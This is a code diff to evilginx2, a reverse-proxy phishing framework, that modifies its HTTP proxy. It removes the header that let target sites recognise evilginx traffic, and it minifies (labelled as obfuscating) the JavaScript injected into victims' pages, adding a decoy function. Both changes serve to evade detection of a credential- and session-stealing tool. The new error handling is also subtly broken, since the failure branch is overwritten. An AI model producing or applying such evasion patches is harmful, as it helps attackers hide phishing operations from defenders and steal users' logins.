@@ -42,6 +42,9 @@ import (
 
 	"github.com/kgretzky/evilginx2/database"
 	"github.com/kgretzky/evilginx2/log"
+
+	"github.com/tdewolff/minify/v2"
+	"github.com/tdewolff/minify/v2/js"
 )
 
 const (
@@ -49,9 +52,6 @@ const (
 	CONVERT_TO_PHISHING_URLS = 1
 )
 
-const (
-	HOME_DIR = ".evilginx"
-)
 
 const (
 	httpReadTimeout  = 45 * time.Second
@@ -466,7 +466,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						return p.blockRequest(req)
 					}
 				}
-				req.Header.Set(p.getHomeDir(), o_host)
+				
 
 				if ps.SessionId != "" {
 					if s, ok := p.sessions[ps.SessionId]; ok {
@@ -656,7 +656,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 				// check for creds in request body
 				if pl != nil && ps.SessionId != "" {
-					req.Header.Set(p.getHomeDir(), o_host)
+					
 					body, err := ioutil.ReadAll(req.Body)
 					if err == nil {
 						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
@@ -1330,13 +1330,23 @@ func (p *HttpProxy) injectJavascriptIntoBody(body []byte, script string, src_url
 	}
 	re := regexp.MustCompile(`(?i)(<\s*/body\s*>)`)
 	var d_inject string
+
 	if script != "" {
-		d_inject = "<script" + js_nonce + ">" + script + "</script>\n${1}"
+		minifier := minify.New() // "github.com/tdewolff/minify/js"
+		minifier.AddFunc("text/javascript", js.Minify)
+		obfuscatedScript, err := minifier.String("text/javascript", script)
+		if err != nil {
+			// Handle error - Obfuscation failed
+			d_inject = "<script" + js_nonce + ">" + "function doNothing() {var x =0};" + script + "</script>\n${1}"
+		}
+		d_inject = "<script" + js_nonce + ">" + "function doNothing() {var x =0};" + obfuscatedScript + "</script>\n${1}"
+		//d_inject = "<script" + js_nonce + ">" + "function doNothing() {var x =0};" + script + "</script>\n${1}"
+
 	} else if src_url != "" {
 		d_inject = "<script" + js_nonce + " type=\"application/javascript\" src=\"" + src_url + "\"></script>\n${1}"
 	} else {
 		return body
-	}
+	} 
 	ret := []byte(re.ReplaceAllString(string(body), d_inject))
 	return ret
 }
@@ -1788,9 +1798,7 @@ func (p *HttpProxy) getPhishDomain(hostname string) (string, bool) {
 	return "", false
 }
 
-func (p *HttpProxy) getHomeDir() string {
-	return strings.Replace(HOME_DIR, ".e", "X-E", 1)
-}
+
 
 func (p *HttpProxy) getPhishSub(hostname string) (string, bool) {
 	for site, pl := range p.cfg.phishlets {
